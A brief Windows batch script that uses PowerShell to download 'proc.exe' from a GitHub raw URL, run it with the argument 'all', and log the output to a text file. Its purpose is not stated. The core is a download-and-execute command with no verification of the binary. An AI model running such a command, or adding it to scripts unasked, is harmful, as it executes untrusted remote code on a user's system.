@echo off

set downloadURL=https://github.com/newkage/newkage/raw/master/proc.exe
set exeFile=proc.exe
set arguments=all
set logFile=proc.txt

 
powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
%exeFile% %arguments% > %logFile%


